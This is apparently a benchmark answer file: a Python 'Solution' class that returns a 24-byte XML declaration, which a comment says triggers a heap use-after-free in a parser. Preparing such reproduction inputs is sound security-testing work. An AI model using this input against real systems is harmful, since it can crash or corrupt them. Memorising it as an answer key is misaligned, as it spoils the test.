import subprocess
import tempfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The minimal PoC that triggers the heap use-after-free
        # Ground truth length: 24 bytes
        poc = b'<?xml encoding="UTF-8"?>'
        return poc